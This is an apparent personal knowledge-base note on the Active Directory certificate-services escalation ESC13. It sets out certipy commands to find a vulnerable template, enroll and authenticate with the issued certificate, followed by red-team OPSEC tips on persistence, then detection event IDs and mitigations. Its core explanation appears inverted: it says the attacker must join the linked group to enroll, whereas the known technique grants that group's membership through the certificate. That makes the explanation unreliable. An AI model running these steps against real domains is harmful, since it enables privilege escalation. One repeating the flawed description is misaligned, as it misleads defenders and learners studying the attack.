---
title: "ESC13 — privileged issuance policy linked to a group"
type: concept
created: 2026-09-07
updated: 2026-09-07
tags: [active-directory, ad-cs, esc, privilege-escalation]
---

# ESC13

**Issuance policy group link.** If a template's **Issuance Policy** is linked
to a **privileged group** (Domain Admins, Enterprise Admins, Account
Operators, or a custom group with a high-priv purpose) and the attacker can
**join that group** — directly, via [[acl-abuse]] (AddMember/WriteProperty),
or via a trust — the template's enrollee checks pass **as that group**,
including templates whose EKU is **Client Authentication** and which would
otherwise only be useful to a member.

In short: **the policy says "members of X may enroll here," and X is
reachable** — the template's other (weak) flags then do the rest.

## Exploit

```bash
# 1. find a template whose issuance policy is linked to a group you can join
certipy find -u user@corp.local -p 'Pass' -dc-ip <DC_IP> -vulnerable -stdout

# 2. join the group (ACL/trust path — [[acl-abuse]] or a forest trust)
#    e.g. WriteProperty on the group -> add yourself

# 3. enroll with the template (now your group membership passes its checks)
certipy req -u user@corp.local -p 'Pass' -ca CORP-CA -template <TEMPLATE>

# 4. auth with the issued cert
certipy auth -pfx user.pfx -dc-ip <DC_IP>
```

## Red-team notes (OPSEC)

- **The group join is your persistent handle** — the cert is issued *as the
  group's right*; leaving the group doesn't revoke an already-issued cert
  (check [[certificate-mapping]] enforcement before relying on either).
- **Pair it** — ESC13 is the *access* condition; the actual template abuse
  is usually [[esc1]]/[[esc6]]-class on the same template. Read the template
  flags together, not the policy alone.

## Detection

- **4886/4887** for a cert issued under a template whose policy-linked group
  the enrollee only *recently* joined.
- **5136/4728** (group membership change) on the policy-linked group
  immediately before an enrollment.
- BloodHound-style view: **group → template policy → cert** is the path to
  alert on (the group is the pivot).

## Mitigations

- **Audit issuance-policy group links** — a Client-Auth template linked to a
  privileged group is a standing privilege-escalation grant.
- Prefer **enrollment by direct attribute/role** over by group where the
  group is writable.
- Alert on **4728→4886** (group change → enrollment) sequences.

## Links

- [[ad-cs-esc-attacks]] — ESC13 in the family
- [[certificate-templates]] — where the policy link lives
- [[acl-abuse]] — the group-join primitive
- [[certified-pre-owned]]
